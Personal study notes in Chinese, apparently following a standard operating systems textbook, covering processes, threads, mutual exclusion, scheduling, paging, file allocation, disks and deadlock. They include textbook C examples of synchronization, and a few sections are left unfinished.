## process and threads

### Process

**multiprogramming**：针对单个CPU，为了实现伪并行，不停在各个process中切换，每个process跑个10到100毫秒。

在Unix中，一个父process可以产生一个或多个子process，而在windows中，没有这样的概念，对于父process会给一个特殊的token（handle）

**process table**：为了实现进程模型，操作系统维护一个表(结构数组)，称为process table，每个进程有一个条目。(一些作者称这些条目为进程控制块。)这个条目包含关于进程状态的重要信息，包括它的程序计数器、堆栈指针、内存分配、打开文件的状态、记分和调度信息，以及当进程从运行状态切换到就绪或阻塞状态时必须保存的关于进程的所有其他信息，以便它可以稍后重新启动，就像它从未停止过一样。在了解进程表后，可以进一步解释如何在一个(或每个)CPU上维护多个顺序进程的假象了。与每个I/O类相关联的是一个称为中断向量的位置(通常位于内存底部附近的固定位置)。它包含中断服务过程的地址。假设当磁盘中断发生时，用户进程3正在运行。用户进程3的程序计数器、程序状态字，有时还有一个或多个寄存器被中断硬件推入(当前)堆栈。然后计算机跳转到中断向量中指定的地址。这就是硬件的全部功能。从这里开始，它取决于软件，特别是中断服务程序。

| Process management                                           | Memory management             | File management   |
| ------------------------------------------------------------ | ----------------------------- | ----------------- |
| Registers                                                    | Pointer to text segment info  | Root directory    |
| Program counter                                              | Pointer to data segment info  | Working directory |
| Program status word                                          | Pointer to stack segment info | File descriptors  |
| Stackpointer UserID                                          |                               |                   |
| Process state Group ID                                       |                               |                   |
| Priority<br/>Scheduling parameters<br/>Process ID<br/>Parent process<br/>Process group<br/>Signals<br/>Time when process started<br/>CPU time used<br/>Children’s CPU time<br/>Time of next alarm |                               |                   |

### Threads

一般来说，创造一个thread要比一个process快10-100倍。当所有线程都受CPU限制时，线程不会产生性能提升，但是当有大量的计算和大量的I/O时，线程允许这些活动重叠，从而加快应用程序的速度

process的一种看法的是process将相关资源分组在一起。process有一个地址空间，其中包含程序文本和数据，以及其他资源。这些资源可能包括打开的文件、子process、挂起的警报、信号处理程序、accounting information等等。通过将它们以process的形式组合在一起，可以更容易地管理它们。process的另一个概念是执行线程，通常简称为thread。thread有一个程序计数器，它跟踪下一个要执行的指令。它有寄存器，用来保存当前的工作变量。它有一个堆栈，其中包含执行历史，每个调用但尚未返回的过程都有一个帧。虽然thread必须在某个process中执行，但是thread和它的process是不同的概念，可以分开处理。process用于将资源组合在一起；thread是计划在CPU上执行的实体。

thread为process添加的功能是允许在相同的process环境中进行多个执行，并且在很大程度上彼此独立。在一个process中并行运行多个thread类似于在一台计算机中并行运行多个process。在前一种情况下，thread共享地址空间和其他资源。在后一种情况下，process共享物理内存、磁盘、打印机和其他资源。因为thread具有process的一些属性，所以它们有时被称为轻量级process。术语multithreading也用于描述允许在同一process中使用多个thread的情况。一些cpu对multithreading有直接的硬件支持，并允许thread切换在纳秒的时间尺度上发生。

**Posix Threads**：定义了一些thread有关的函数，如在linux的C语言中的pthread_exit等。

### Interprocess communciation

process经常需要与其他process通信，在process之间进行通信时，最好采用结构良好的方式，而不使用中断。在下面的部分中，我们将研究与Interprocess communciation(IPC)相关的一些问题。简单地说，这里有三个问题。上面提到了第一个问题:一个process如何将信息传递给另一个process。第二个是确保两个或更多process不会相互妨碍，例如，航空公司预订系统中的两个process各自试图为不同的客户抢占飞机上的最后一个座位。第三个问题涉及存在依赖关系时的适当排序：如果processA产生数据，processB打印它们，则B必须等到A产生一些数据后才开始打印。

**race  condition**：两个或多个process正在读取或写入一些共享数据，并且最终结果取决于谁在准确的时间运行。如何避免这一问题，**mutual  exclusion**。

一个好的解决方案需要满足的四个条件：

1. 没有两个process可以同时处于它们的临界区域内。

2. 不能对速度或cpu数量做任何假设。

3. 任何在临界区域外运行的process都不能阻塞其他process。

4. 任何process都不应该永远等待进入其临界区域。 

#### mutual exclusion的方法

1. 屏蔽中断：在单处理器系统上，最简单的解决方案是让每个process在进入临界区域后禁用所有中断，并在离开临界区域之前重新启用中断。但这样不可行，对于多核系统来说，屏蔽了一个CPU的中断，还会有其它CPU的中断
2. 变量锁：一种软件解决方案，考虑使用单个共享(锁)变量，初始值为0。当一个进程想要进入它的临界区域时，它首先测试锁。如果锁为0，则进程将其设置为1并进入临界区域。如果锁已经为1，则进程将一直等待，直到锁变为0。因此，0表示没有进程在临界区域内，1表示有进程在临界区域内。还是不可行，假设一个process读取锁并看到它为0。在它将锁设置为1之前，另一个process被调度、运行并将锁设置为1。当第一个进程再次运行时，它也会将锁设置为1，两个进程将同时处于它们的临界区域。
3. 严格轮换法：下面的程序分别代表两个process，turn为一个变量，初始为0。一开始process0发现turn为0，进入临界区域，process1发现为0，一直在循环，连续测试一个变量，直到某个值出现，称为忙碌等待。通常应该避免这样做，因为这会浪费CPU时间。只有当有合理的预期等待时间会很短时，才会使用忙等待。使用忙等待的锁称为自旋锁。当process0离开临界区域时，它将turn设置为1，以允许process1进入其临界区域。假设process1很快地完成了它的临界区域，因此两个process都在它们的非临界区域，turn设为0。现在process0快速执行整个循环，退出临界区域并将turn设置为1。此时turn为1，两个进程都在各自的非临界区域执行。

```c
// process0
while(TRUE){
    while(turn != 0) /* loop */ ;	// 注意;，此处当turn为1时，会一直循环
	critical_region( );
	turn = 1;
	noncritical_region( );
}

// process1
while(TRUE){
    while(turn != 1) /* loop */ ;
	critical_region( );
	turn = 0;
	noncritical_region( );
}
```

突然间，process0结束了它的非临界区域，回到了循环的顶端。不幸的是，它现在不允许进入它的临界区域，因为turn是1，process1忙于它的非临界区域。它一直挂在while循环中，直到process1设置为0。换句话说，当其中一个过程比另一个慢得多时，轮流进行并不是一个好主意。

4. Peterson的方法：荷兰数学家t·德克尔(T. Dekker)将轮流的想法与锁变量和警告变量的想法结合起来，是第一个设计出不需要严格交替的互斥问题软件解决方案的人。

```c
#define FALSE 0
#define TRUE 1
#define N 2 /* number of processes */
int turn; /* whose turn is it? */
int interested[N]; /* all values initially 0 (FALSE) */
 /* process is 0 or 1 */
void enter_region(int process){
    int other; /* number of the other process */
    other = 1 − process; /* the opposite of process */
    interested[process] = TRUE; /* show that you are interested */
    turn =process; /* set flag */
    while (turn == process && interested[other] == TRUE) /* null statement */ ;
}
/* process: who is leaving */
void leave_region(int process){
	interested[process] = FALSE; /* indicate departure from critical region */
}
```

在使用共享变量之前(即，在进入其临界区域之前)，每个process调用带有自己的进程号(0或1)作为参数的*enter_region*。这个调用将导致它等待，如果需要的话，直到安全进入。在使用完共享变量之后，process调用*leave_region*来指示完成，并允许其他process进入(如果需要的话)。最初，两个process都不在临界区域。现在process0调用*enter_region*。它通过设置其数组元素并将turn设置为0来表示其兴趣。由于process1不感兴趣，因此立即返回*enter_region*。如果process1现在调用*enter_region*，它将在那里挂起，直到interest[0]变为FALSE，这个事件仅在process0调用*leave_region*以退出临界区域时发生。

现在考虑两个process几乎同时调用*enter_region*的情况。两者都将依次存储它们的进程号。最后完成的存储才是最重要的；第一个被覆盖并丢失了。假设process1最后存储，那么turn是1。当两个进程都进入while语句时，进程0执行该语句0次，并进入其临界区域。process1循环，直到process0退出临界区域才进入临界区域。

#### sleep and wakeup

**priority inversion problem（优先级反演问题）**：当有两个process H和L，其中H的优先级更高，当L处于临界区域时，H在忙碌的等待，但由于H在运行时，L并不会被调度（因为H的优先级更高），所以L就没有机会离开临界区域，H便会一直循环。

**生产者，消费者问题**：用C语言描述如下

```c
#define N 100 /* number of slots in the buffer */
int count = 0; /* number of items in the buffer */
void producer(void){
    int item;
    while (TRUE){ /* repeat forever */
        item = produce_item( ); /* generate next item */
        if (count == N) sleep( ); /* if buffer is full, go to sleep */
        insert_item(item); /* put item in buffer */
        count = count + 1; /* increment count of items in buffer */
        if (count == 1) wakeup(consumer); /* was buffer empty? */
    }
}
void consumer(void){
    int item;
    while (TRUE) { /* repeat forever */
        if (count == 0) sleep( ); /* if buffer is empty, got to sleep */
        item = remove_item( ); /* take item out of buffer */
        count = count −1; /* decrement count of items in buffer */
        if (count == N − 1) wakeup(producer); /* was buffer full? */
        consume_item(item); /* print item */
	}
}
```

这段程序存在一个问题，因为对count的访问是不受约束的。因此，可能会发生以下情况。缓冲区是空的，消费者只是读取count，看看它是否为0。这时调度器决定暂时停止运行消费者，并开始运行生产者。生产者在缓冲区中插入一个item，增加count，并注意到它现在是1。由于count为0，因此消费者一定在睡觉，因此生产者调用*wakeup*来唤醒消费者。不幸的是，消费者在逻辑上还没有进入睡眠状态，所以唤醒信号丢失了。当消费者下次运行时，它将测试之前读取的count值，发现它为0，然后进入睡眠状态。生产者迟早会填满缓冲区并进入睡眠状态。两人都将长眠。这里问题的本质是，发送给(尚未)处于睡眠状态的process的唤醒会丢失。如果没有丢，一切都会好的。一个快速的解决办法是修改规则，在上面的程序中添加一个唤醒等待位。当一个唤醒被发送到一个仍然处于唤醒状态的process时，这个位被设置。稍后，当process试图进入睡眠时，如果唤醒等待位打开，它将被关闭，但进程将保持清醒。唤醒等待位是存储唤醒信号的储钱罐。消费者在循环的每次迭代中清除唤醒等待位。

#### 信号量（semaphore）

使用整数变量来计算保存以供将来使用的唤醒数量。信号量的值可以为0，表示没有保存唤醒；如果有一个或多个唤醒挂起，则可以为正值。Dijkstra建议对信号量进行两种操作，现在通常称为down和up(分别是睡眠和唤醒的概括)。

信号量的down操作检查其值是否大于0。如果是，它会减少值(即，用完一个存储的唤醒)，然后继续。如果该值为0，则该进程暂时不完成down操作而进入睡眠状态。检查值、更改值以及可能进入休眠状态，都是作为单个的、不可分割的原子动作完成的。可以保证，一旦信号量操作开始，在操作完成或阻塞之前，没有其他process可以访问该信号量。这种原子性对于解决同步问题和避免竞争条件是绝对必要的。原子操作在计算机科学的许多其他领域也非常重要，在原子操作中，一组相关的操作要么全部不中断地执行，要么根本不执行。

向上操作增加所寻址的信号量的值。如果一个或多个process在该信号量上休眠，无法完成较早的down操作，则系统将选择其中一个process(例如随机选择)并允许其完成down操作。因此，一个有process占用的信号量进行up操作之后，这个信号量仍然是0，但是占用它的process会减少一个。增加信号量和唤醒一个process的操作也是不可分割的。没有process会阻塞up操作，就像在早期模型中没有process会阻塞唤醒一样。

用信号量也可以解决生产者，消费者问题，详见：P162页。

。。。。后面还有一些不想看了



### Scheduling

调度算法分为preemptive和nonpreemptive的，nonpreemptive调度算法选择一个要运行的进程，然后让它运行，直到它阻塞(要么在I/O上，要么等待另一个进程)，要么主动释放CPU。即使长时间运行，也不会被强行暂停。实际上，在时钟中断期间不会做出任何调度决策。时钟中断处理完成后，在中断之前运行的进程被恢复，除非有更高优先级的进程正在等待现已满足的超时。相比之下，preemptive调度算法选择一个进程，并让它最多运行一段固定时间。如果该进程在时间间隔结束时仍在运行，它将被挂起，调度器将选择另一个进程运行(如果有可用进程)。进行抢占式调度需要在时间间隔结束时发生时钟中断，以便将对CPU的控制交还给调度程序。如果没有可用的时钟，非抢占调度是唯一的选择。

根据操作环境（Batch、Interactive、realtime）。Batch系统经常用于商业场景，因此nonpreemptive算法是可以接受的，这种方法减少了进程切换，从而提高了性能。Batch算法实际上是相当通用的，通常也适用于其他情况，这使得它们值得研究，即使对于没有参与企业大型机计算的人也是如此。对于Interactive系统，在具有交互用户的环境中，preemptive对于防止一个process占用CPU并拒绝向其他process提供服务至关重要。即使没有process故意永远运行，一个process也可能由于程序错误而无限期地关闭所有其他进程。需要先发制人来防止这种行为。服务器也属于这一类，因为它们通常服务于多个(远程)用户，所有这些用户都非常着急。电脑用户总是匆匆忙忙的。奇怪的是，在具有实时约束的系统中，有时不需要preemptive，因为process知道它们可能不会运行很长时间，通常会快速完成工作并阻塞。与交互式系统的不同之处在于，实时系统只运行旨在进一步推进当前应用程序的程序。交互式系统是通用的，可以运行任意的程序，这些程序不合作，甚至可能是恶意的。

Batch系统中的调度算法：先到先处理、耗时最短的先处理，剩余运行时间最短的先处理。

**Interactive系统中的调度算法**

1. 循环调度：轮循是最古老、最简单、最公平、使用最广泛的算法之一，假设每个process一样重要。每个process被分配一个时间间隔，称为它的quantum，在此期间它被允许运行。如果该process在quantum结束时仍在运行，则会抢占CPU并将其分配给另一个process。如果process已经阻塞或在超时之前完成，CPU切换将在process阻塞时完成。轮询很容易实现。调度程序所需要做的就是维护一个可运行process列表，当process用完它的quantum后，将其放在列表的最后。
2. 优先调度：为每一个process分配一个优先级，在可运行的process中，优先度最高的先运行。为了防止高优先级process无限期地运行，调度程序可以在每个时钟周期(即每个时钟中断)降低当前运行process的优先级。如果此操作导致其优先级低于下一个最高process的优先级，则会发生process切换。或者，可以为每个process分配允许运行的最大时间量。当这个量用完时，下一个最高优先级的process将有机会运行。
3. 多路排队：建立优先级类，最高类中的process运行一个quantum。次高级类中的process运行两个quantum。下一个process运行四个quantum，以此类推。每当一个process用完分配给它的所有quantum时，它就会被移到一个类中。
4. 最短process优先：选择最短process的可以根据历史信息，进行加权和，如$aT_0+(1-a)T_1$
5. 保障调度：另一种完全不同的调度方法是对用户做出关于性能的真正承诺，然后实现这些承诺。有一个很容易实现的承诺是:如果在您工作时有n个用户登录，那么您将获得大约1/n的CPU功率。类似地，在运行n个process的单用户系统上，在所有条件相同的情况下，每个process应该获得1/n个CPU周期。这似乎很公平。
6. lottery算法：虽然向用户做出承诺，然后兑现承诺是个好主意，但很难实现。可以用lottery算法以更简单的实现提供类似的可预测结果。
7. 公平分享调度：每个用户都分配了一部分CPU，调度器以强制执行的方式选择process。因此，如果有两个用户，他们各自都会得到50%的CPU，不管他们有多少process。

### Classical IPC problems

1. 哲学家就餐问题
2. 读者与作者问题

### 总结

1. 为了隐藏中断的影响，操作系统提供了一个由并行运行的顺序process组成的概念模型。process可以动态地创建和终止。每个process都有自己的地址空间。
2. 对于某些应用程序，在单个process中使用多个控制thread是很有用的。这些thread是独立调度的，每个thread都有自己的堆栈，但是一个进程中的所有thread共享一个公共地址空间。thread可以在用户空间或内核中实现。
3. process之间可以使用process间通信原语进行通信，例如，信号量、监视器或消息。这些原语用于确保没有两个process同时处于它们的临界区域，否则会导致混乱。process可以处于运行状态、可运行状态或阻塞状态，并且可以在它或另一个process执行process间通信原语之一时改变状态。thread间通信也是类似的。
4. process间通信原语可用于解决诸如生产者-消费者、用餐哲学家和读者-作者等问题。即使使用这些原语，也必须小心避免错误和死锁。
5. 人们研究了大量的调度算法。其中一些主要用于批处理系统，例如最短作业优先调度。其他一些在批处理系统和交互系统中都很常见。这些算法包括轮循、优先级调度、多级队列、保证调度、彩票调度和公平共享调度。有些系统在调度机制和调度策略之间进行了清晰的分离，这使得用户可以控制调度算法。



## Memory management

只要用户键入一个命令，操作系统就会将请求的程序从磁盘复制到内存中并执行它。当进程结束时，操作系统显示一个提示字符并等待用户的新命令。当操作系统接收到该命令时，它将一个新程序加载到内存中，覆盖第一个程序。在没有内存抽象的系统中获得一些并行性的一种方法是使用多线程编程。由于一个进程中的所有线程都应该看到相同的内存映像，因此它们被强制这样做并不是问题。虽然这个想法是有效的，但它的用途有限，因为人们通常想要的是同时运行不相关的程序，这是线程抽象所不能提供的。此外，任何没有提供内存抽象的原始系统都不太可能提供线程抽象。

内存的抽象：地址空间

base registers存放程序开始的位置；limit registers存放程序的长度。

多年来已经开发了两种处理内存过载的通用方法。最简单的策略，称为交换，包括将每个进程完整地引入，运行一段时间，然后将其放回磁盘。空闲进程大多存储在磁盘上，因此它们在不运行时不会占用任何内存(尽管其中一些进程会周期性地唤醒以完成工作，然后再次进入睡眠状态)。另一种策略称为虚拟内存，它允许程序即使部分在主内存中也能运行。下面我们将学习交换;在3.3节中，我们将研究虚拟内存。

**virtual memory（虚拟内存）**：虚拟内存背后的基本思想是，每个程序都有自己的地址空间，这些地址空间被分解成称为页的块。每一页都是一个连续的地址范围。这些页被映射到物理内存中，但并不是所有的页都必须同时在物理内存中才能运行程序。当程序在物理内存中引用其地址空间的一部分时，硬件会动态地执行必要的映射。当程序引用其地址空间中不在物理内存中的部分时，操作系统会收到警报，获取丢失的部分并重新执行失败的指令。

对于32位的地址长度，每个page大小为4kb，一共会有$2^{20}$个页。

#### 页面替换算法

当出现Page Fault（缺页异常，要访问的页不在主存，需要操作系统将其调入主存后再进行访问。）时，操作系统必须选择要退出(从内存中删除)的页面，以便为进入的页面腾出空间。如果要删除的页在内存中被修改过，则必须将其重写到磁盘以使磁盘副本更新。但是，如果页面没有被更改(例如，它包含程序文本)，则磁盘副本已经是最新的，因此不需要重写。要读入的页只是覆盖要被退出的页。

**最优页面替换算法**：最好的页面替换算法很容易描述，但不可能实际实现。当出现Page Fault时，内存中有一组页面。其中一个页面将在下一个指令(包含该指令的页面)中被引用。其他页面可能直到10、100或1000条指令之后才被引用。每一页都可以用在第一次引用该页之前将要执行的指令的数量来标记。最优的页面替换算法认为应该删除标签最高的页面。如果一个页面不会用于800万条指令，另一个页面不会用于600万条指令，那么删除前者会将Page Fault推到尽可能远的未来。电脑和人一样，会尽可能地推迟不愉快的事情。

**最近未使用的页面替换算法**：为了允许操作系统收集有用的页面使用统计信息，大多数具有虚拟内存的计算机都有两个状态位，R和M，与每个页面相关联。R是在页面被引用(读或写)时设置的。M是在写入(即修改)页时设置的。NRU (Not Recently Used)算法从编号最低的非空类中随机删除一个页面。该算法隐含的思想是，删除至少一个时钟周期(通常约为20毫秒)内未被引用的修改过的页面比删除大量使用的干净页面要好。NRU的主要吸引力在于它易于理解，实现效率适中，并提供了一个性能，虽然肯定不是最佳的，但可能是足够的。

**先进先出(FIFO)页面替换算法**：作为页面替换算法，同样的思想也是适用的。操作系统维护当前内存中所有页面的列表，最常用的页面放在尾部和最不常用的页面放在头部。如果出现Page Fault，则删除位于页面头部的页面，并将新页面添加到列表的尾部。当应用于计算机时，同样的问题出现了：最旧的页面可能仍然有用。出于这个原因，FIFO的纯粹形式很少被使用。

**第二次页面替换算法**：对FIFO的一个简单修改是检查最旧页面的R位，以避免抛出大量使用的页面的问题。如果该值为0，则该页既旧又未使用，因此将立即替换它。如果R位为1，则清除该位，将该页放到页列表的末尾，并更新其加载时间，就像它刚刚到达内存一样。然后继续搜索。

**最近最少使用(LRU)页面替换算法**：对最优算法的一个很好的近似是基于以下观察:在最后几条指令中被大量使用的页面可能很快又会被大量使用。相反，长时间未使用的页面可能会在很长一段时间内不使用。这个想法提出了一种可实现的算法:当出现Page Fault时，丢弃长时间未使用的页面。这种策略称为LRU(最近最少使用)分页。

| Algorithm                  | Comment                                        |
| -------------------------- | ---------------------------------------------- |
| Optimal                    | Not implementable, but useful as a benchmark   |
| NRU (Not Recently Used)    | Very crude approximation of LRU                |
| FIFO (First-In, First-Out) | Might throw out important pages                |
| Second chance              | Big improvement over FIFO                      |
| Clock                      | Realistic                                      |
| LRU (Least Recently Used)  | Excellent, but difficult to implement exactly  |
| NFU (Not Frequently Used)  | Fairly crude approximation to LRU              |
| Aging                      | Efficient algorithm that approximates LRU well |
| Working set                | Somewhat expensive to implement                |
| WSClock                    | Good efficient algorithm                       |

现代计算机通常有某种形式的虚拟内存。在最简单的形式中，每个进程的地址空间被分成大小一致的块，称为页，这些块可以放在内存中任何可用的页框架中。有很多页面替换算法;两种较好的算法是aging和WSClock。



## File systems

### File-system implemention

文件系统存储在磁盘上。大多数磁盘可以划分为一个或多个分区，每个分区上都有独立的文件系统。磁盘的第0扇区称为MBR(主引导记录)，用于引导计算机。MBR的末尾包含分区表。该表给出了每个分区的起始地址和结束地址。表中的一个分区被标记为活动。当计算机启动时，BIOS读入并执行MBR。MBR程序所做的第一件事是定位活动分区，读入它的第一个块(称为引导块)，然后执行它。引导块中的程序加载该分区中包含的操作系统。为了一致性，每个分区都从一个引导块开始，即使它不包含可引导的操作系统。此外，它可能在未来包含一个。

#### 文件实现

**连续分配**：最简单的分配方案是将每个文件存储为连续运行的磁盘块。因此，在1-kb块的磁盘上，将为一个50- kb的文件分配50个连续块。对于2-kb块的磁盘，它将分配25个连续的块。连续磁盘空间分配有两个显著的优点。首先，它很容易实现，因为跟踪文件块的位置只需要记住两个数字:第一个块的磁盘地址和文件中的块数量。给定第一个区块的编号，可以通过简单的加法找到任何其他区块的编号。其次，读取性能非常好，因为可以在一次操作中从磁盘读取整个文件。只需要一次寻道(到第一个块)。在此之后，不再需要更多的寻道或旋转延迟，因此数据以磁盘的全部带宽进入。因此，连续分配易于实现，具有较高的性能。**不幸的是，连续分配也有一个非常严重的缺点:随着时间的推移，磁盘会变得碎片化。**但是，有一种情况下连续分配是可行的，而且实际上仍在使用：在cd-ROMS。在这里，所有的文件大小都是预先知道的，并且在后续使用CD-ROM文件系统期间永远不会改变。

**链表分配**：第二种存储文件的方法是将每个文件保存为磁盘块的链表。每个块的第一个单词用作指向下一个块的指针。块的其余部分用于数据。与连续分配不同，每个磁盘块都可以在此方法中使用。磁盘碎片不会丢失任何空间(除了最后一个块中的内部碎片)。此外，目录条目仅存储第一个块的磁盘地址就足够了。其余的可以从那里开始找到。另一方面，虽然按顺序读取文件很简单，但是随机访问非常慢。为了到达第n块，操作系统必须从头开始，一次一个地读取之前的n - 1块。显然，做这么多的读取将会非常缓慢。此外，块中的数据存储量不再是2的幂，因为指针占用了几个字节。虽然不是致命的，但是使用特殊的大小会降低效率，因为许多程序都是在大小为2的次幂的块中读写的。由于每个块的前几个字节被指向下一个块的指针占用，读取整个块大小需要从两个磁盘块获取和连接信息，这将由于复制而产生额外的开销

**使用内存中的表进行链表分配**：通过从每个磁盘块中取出指针字并将其放入内存中的表中，可以消除链表分配的两个缺点。使用这种组织，整个块都可用于数据。此外，随机访问要容易得多。尽管仍然必须遵循该链才能在文件中找到给定的偏移量，但该链完全位于内存中，因此可以在不引用任何磁盘的情况下遵循该链。与前一种方法一样，无论文件有多大，目录条目保留单个整数(起始块号)并且仍然能够定位所有块就足够了。

**I-nodes**：我们跟踪哪个块属于哪个文件的最后一种方法是与每个文件关联一个称为i-node(索引节点)的数据结构，它列出了文件块的属性和磁盘地址。与使用内存表的链表文件相比，这种方案的最大优点是，只有当相应的文件打开时，i-node才需要在内存中。如果每个i-node占用n字节，并且一次最多可以打开k个文件，那么保存打开文件的i个节点的数组所占用的总内存仅为kn字节。只需要提前预订这么多的空间。



## INPUT/OUTPUT

### Principles of I/O hardware

#### I/O Devices

I/O设备大致可以分为两类:块设备和字符设备。块设备将信息存储在固定大小的块中，每个块都有自己的地址。常见的块大小范围是512到65,536字节。所有传输都以一个或多个完整(连续)块为单位。块设备的基本属性是可以独立于其他所有块来读取或写入每个块。硬盘、蓝光光盘和u盘是常见的块设备。另一种类型的I/O设备是字符设备。字符设备传送或接受一个字符流，而不考虑任何块结构。它不是可寻址的，也没有任何查找操作。打印机、网络接口、鼠标(用于指向)、大鼠(用于心理学实验室实验)和大多数其他不像磁盘的设备都可以被视为字符设备。

### Disks

#### Magnetic disks

磁盘被组织成圆柱体，每个圆柱体包含与垂直堆叠的磁头一样多的磁道。磁道被分成扇区，在软盘上，扇区的周长通常是8到32个，而在硬盘上，扇区的周长可达几百个。磁头的个数从1到16不等。旧的磁盘几乎没有电子设备，只是提供一个简单的串行比特流。在这些磁盘上，控制器完成大部分工作。在其他磁盘上，特别是IDE (Integrated Drive Electronics)和SATA (Serial ATA)磁盘，磁盘驱动器本身包含一个微控制器，它可以完成相当多的工作，并允许真正的控制器发出一组高级命令。控制器经常执行跟踪缓存、坏块重新映射等工作。

## dead lock

**定义**：对于许多应用程序，一个进程需要独占访问的资源不是一个，而是多个。例如，假设两个进程都想在蓝光光盘上记录扫描的文档。进程A请求使用扫描程序的权限，并获得了该权限。进程B的编程方式不同，它首先请求蓝光刻录机，并且也获得了它。现在A请求使用蓝光刻录机，但是请求被暂停，直到B释放它。同时，由于B无法申请到扫描仪的权限，所以也不能释放蓝光录音机。在这一点上，两个进程都被阻塞，并将永远保持这种状态。这种情况称为死锁。

资源分为可抢夺和不可抢夺的，一般死锁是因为遇到不可抢夺的。

### Introcuction to deadlock

一般遇到的deadlock都是资源死锁，即每个进程正在等待的事件是当前由该集合的另一个成员拥有的某些资源的释放。换句话说，死锁进程集合中的每个成员都在等待由死锁进程拥有的资源。没有一个进程可以运行，没有一个进程可以释放资源，也没有一个进程可以被唤醒。进程的数量以及所拥有和请求的资源的数量和种类都不重要。这个结果适用于任何类型的资源，包括硬件和软件。

资源图的画法

![image-20231009193046717](D:\TyporaImages\image-20231009193046717.png)

**（资源）死锁的四个条件**

1. 互斥条件。每个资源要么当前只分配给一个进程，要么是可用的。
2. Hold-and-wait条件。当前持有先前授予的资源的进程可以请求新的资源。
3. No-preemption条件。以前授予的资源不能从进程中强制拿走。它们必须由持有它们的进程显式地释放。
4. 循环等待条件。必须有一个包含两个或更多进程的循环列表，每个进程都在等待由链的下一个成员持有的资源。

**四种策略**

1. 忽略这个问题。也许你无视它，它也会无视你。（鸵鸟算法）
2. 检测和恢复。让它们发生，发现它们，然后采取行动。
3. 通过谨慎的资源分配进行动态规避。
4. 预防，从结构上否定四个条件中的一个。



### deadlock detection and recovery

#### detection

系统不会阻止死锁的发生，相反，系统会检测什么时候发生，采取一些行动来恢复。问题就是如何找到哪些进程参与到死锁中。

对于每种资源只有一个的情况，可以通过画资源图，找闭环来确定，找闭环的算法如下：

1. 对于图中的每个节点N，以N为起始节点执行以下五个步骤。
2. 将L初始化为空列表，并将所有圆弧指定为未标记。
3. 将当前节点添加到L的末尾，并检查该节点现在是否在L中出现了两次。如果是，则图中包含一个循环(列在L中)，算法终止。
4. 从给定的节点，查看是否有任何未标记的外向弧线（外向指从给定节点向外有没有到另外一个节点的线）。如果有转步骤5；没有的话转步骤6。
5. 随机选择一个未标记的外向弧线并标记它。选择弧的另一个节点作为新的当前节点，然后转到步骤3。
6. 如果该节点为初始节点，则图中不包含任何循环，算法终止。否则，我们现在就进入了死胡同。删除它并返回到前一个节点，也就是在这个节点之前的当前节点，使这个节点成为当前节点，然后转到步骤3。

将这个算法用于每个节点上，如果找到环的话就停止算法。这个算法远远没有达到最优，更好的可以参见Even (1979) [Graph Algorithms (cambridge.org)](https://www.cambridge.org/core/books/graph-algorithms/8B295BD0845A174FFE6B2CD6D4B2C63F)

当存在某些资源的多个副本时，需要使用不同的方法来检测死锁。可以使用一种基于矩阵的算法来检测从$P_1$到$P_n$的n个进程之间的死锁。设资源类数为$m$，其中$E_1$资源为第1类，$E_2$资源为第2类，一般为$E_i$资源为第$i$类(1≤i≤m)， $E$为现有资源向量。它给出了存在的每个资源的实例总数。例如，如果类1是磁带机，那么$E_1=2$表示系统有两个磁带机。在任何时刻，都有一些资源被分配并且不可用。设$A$为可用资源向量，$A_i$给出当前可用资源$i$的实例数(即未分配)。如果我们的两个磁带机都分配了，$A_1$将为0。现在我们需要两个矩阵，$C$是当前分配矩阵，$R$是请求矩阵。$C$的第$i$行告诉当前该进程占用的每个资源类$P_i$的实例数量。因此，$C_{ij}$是进程$i$占用的资源$j$的实例数。类似地，$R_{ij}$是进程$i$申请的资源$j$的实例数。

因此有等式（占用的加上可用的等于总数）
$$
\sum_{i=1}^nC_{ij}+A_j=E_j
$$
死锁检测算法是基于向量比较的。我们在两个向量A和B上定义A≤B的关系，表示A的每个元素小于或等于B的对应元素。数学上，当且仅当1≤i≤m时，A≤B成立。

每个进程最初被认为是没有标记的。随着算法的进展，进程将被标记，表明它们能够完成，因此没有死锁。当算法终止时，任何未标记的进程都已知为死锁。该算法假设了最坏的情况：所有进程保留所有获得的资源，直到它们退出。死锁检测算法如下：

1. 寻找一个未标记的进程$P_i$，要求$R$的第$i$行小于等于$A$。
2. 如果这样的进程存在，将$C$的第$i$行加到$A$中，标记该进程，然后返回步骤1。
3. 如果不存在这样的进程，则算法终止。

当算法完成时，所有未标记的进程(如果有的话)都被死锁。算法在步骤1中所做的是寻找一个可以运行到完成的进程。这种过程的特点是具有当前可用资源可以满足的资源需求。然后，所选进程将一直运行，直到它完成为止，此时它将持有的资源返回到可用资源池中。然后将其标记为已完成。如果所有进程最终都能够运行到完成，那么它们中没有一个是死锁的。如果其中一些永远无法完成，它们就会陷入僵局。尽管算法是不确定的(因为它可能以任何可行的顺序运行进程)，但结果总是相同的。

#### recovery

找到参与死锁的进程后，现在需要恢复进程。

**通过抢夺来恢复**

在某些情况下，可能会暂时将资源从其当前占用的进程中拿走，并将其交给另一个进程。在许多情况下，可能需要人工干预，特别是在运行在大型机上的批处理操作系统中。例如，要把一台激光打印机从它的主人那里拿走，操作员可以收集所有已经打印的纸张，并把它们堆在一起。然后可以挂起进程(标记为不可运行)。此时，打印机可以分配给另一个进程。当这一过程结束时，打印的纸张可以放回打印机的输出托盘中，并重新开始原始过程。从进程中获取资源，让另一个进程使用它，然后在进程没有注意到的情况下将其返回的能力高度依赖于资源的性质。以这种方式恢复通常是困难的或不可能的。选择挂起的进程在很大程度上取决于哪些进程拥有可以轻松收回的资源。

**通过回滚来恢复**

如果系统设计者和机器操作员知道可能发生死锁，他们就可以安排定期存储进程检查点。设置进程的检查点意味着将其状态写入文件，以便稍后重新启动进程。检查点不仅包含内存映像，还包含资源状态，换句话说，即当前分配给进程的资源。为了达到最有效的效果，新的检查点不应该覆盖旧的检查点，而应该写入新文件，这样当进程执行时，整个序列就会累积起来。当检测到死锁时，很容易看出需要哪些资源。要进行恢复，需要将拥有所需资源的进程回滚到它从较早的一个检查点开始获取该资源之前的某个时间点。自检查点以来完成的所有工作都需要丢弃(例如，自检查点以来打印的输出必须被丢弃，因为它将被再次打印)。实际上，当进程被重置到它没有资源的较早时刻，该资源现在被分配给其中一个参与死锁的进程。如果重新启动的进程试图再次获取资源，它将不得不等待，直到资源变得可用。

**通过终止进程来恢复**

